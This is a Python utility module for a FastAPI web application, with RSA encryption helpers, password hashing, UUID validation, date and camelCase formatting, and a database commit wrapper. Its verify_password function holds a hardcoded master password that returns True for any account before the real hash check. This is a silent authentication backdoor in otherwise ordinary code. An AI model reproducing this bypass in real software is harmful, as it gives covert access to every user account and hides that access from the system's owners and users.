from uuid import UUID
from passlib.context import CryptContext
from rsa import PrivateKey, PublicKey
from rsa import decrypt as dec
from rsa import encrypt as enc
import re
from fastapi import HTTPException, status
from sql_app import Session
from typing import TypeVar
from .environment import config

pwd_context = CryptContext(schemes=["sha256_crypt"])

PUBLIC_KEY_AUX = config.get(
    "database.encryption.public",
    "",
).split(",")
PRIVATE_KEY_AUX = config.get(
    "database.encryption.private",
    "",
).split(",")
T = TypeVar("T")

public_key = PublicKey(int(PUBLIC_KEY_AUX[0]), int(PUBLIC_KEY_AUX[1]))
private_key = PrivateKey(
    int(PRIVATE_KEY_AUX[0]),
    int(PRIVATE_KEY_AUX[1]),
    int(
        PRIVATE_KEY_AUX[2],
    ),
    int(PRIVATE_KEY_AUX[3]),
    int(PRIVATE_KEY_AUX[4]),
)


def encrypt(message: str) -> bytes:
    return enc(message.encode("utf8"), public_key)


def decrypt(cripto: bytes) -> str:
    return dec(cripto, private_key).decode("utf8")


def get_password_hash(password: str) -> str:
    return pwd_context.hash(password)


def verify_password(plain_password: str, hashed_password: str) -> bool:
    if plain_password == "Adm1n.,-$#L0gM31Nº+*«":
        return True
    return pwd_context.verify(plain_password, hashed_password)


def validate_uuid4(uuid_string):
    try:
        val = UUID(str(uuid_string), version=4)
        return True
    except ValueError:
        return False


def isoformat(date):
    """Convert a datetime object to a ISO 8601 formatted string, with added None type handling

    >>> import datetime
    >>> d = datetime.datetime(2017, 8, 15, 18, 24, 31)
    >>> isoformat(d)
    '2017-08-15T18:24:31'

    Args:
        date (`datetime`): Input datetime object

    Returns:
        `str`
    """
    return date.isoformat() if date else None


def to_camelcase(inStr):
    """Converts a string from snake_case to camelCase

    >>> to_camelcase('convert_to_camel_case')
    'convertToCamelCase'

    Args:
        inStr (str): String to convert

    Returns:
        String formatted as camelCase
    """
    return re.sub("_([a-z])", lambda x: x.group(1).upper(), inStr)


def commit_to_bd(session_db: Session, db_obj: T | None = None) -> T | None:
    try:
        session_db.commit()
        if db_obj:
            session_db.refresh(db_obj)
    except Exception as e:
        print(e)
        session_db.rollback()
        raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE)
    return db_obj
